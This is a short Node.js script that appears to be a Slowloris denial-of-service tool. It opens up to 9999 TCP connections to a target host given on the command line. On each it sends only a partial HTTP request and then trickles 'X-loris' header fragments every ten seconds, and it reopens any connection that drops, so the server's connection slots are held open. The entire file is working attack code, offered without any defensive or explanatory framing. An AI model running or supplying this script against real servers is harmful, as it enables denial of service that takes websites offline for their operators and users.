const net = require('net');
const { parse } = require('url');

//url
let url = process.argv[2];
url = parse(url)
const args = {
	host: url.hostname,
	port: url.port || 80
}

//number of connections
let c = process.argv[3] || 9999

//alive connections
let alive = 0;

const open = ()=>{	
	const client = net.connect(args.port, args.host, ()=> {	
		alive++;
		//send just a part of the header, so the server keeps waiting for the rest of the request
		client.write('GET / HTTP/1.1\r\n');
		setInterval(()=>{
		  //send some random stuff to keep connection open as long as possible
		  client.write('X-loris:'+ Math.random()*999000);	
		},10000)
	});	
	
	client.on('error', function() {
		//open a new connection every time a connection dies;
		alive --;
		open();
	});
}

const status = ()=>{
  const P = ["\\", "|", "/", "-"];
  let x = 0;
  return setInterval(()=>{
    process.stdout.write("\r" + P[x++] + " Active connections: " + alive);
    if(x==4)x = 0;
  }, 100);
}

//starting
status();
while(c--){open()}
